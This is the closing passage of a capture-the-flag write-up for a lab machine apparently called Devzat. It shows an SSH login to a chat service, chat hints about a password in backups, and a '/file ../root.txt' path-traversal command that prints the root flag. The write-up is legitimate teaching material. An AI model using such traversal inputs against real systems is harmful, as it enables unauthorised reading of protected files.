Let's connect:

```text
catherine@devzat:~$ ssh -p 8443 catherine@localhost
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups location.
catherine: k
patrick: I also put the main so you could diff main dev if you want.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat
catherine:
```

## Root Flag

Now we can easily grab the root flag:

```text
catherine: /file ../root.txt CeilingCatStillAThingIn2021?
[SYSTEM] 374fe32e1eb4e8585a85d0d89883b636
```

All done. See you next time.
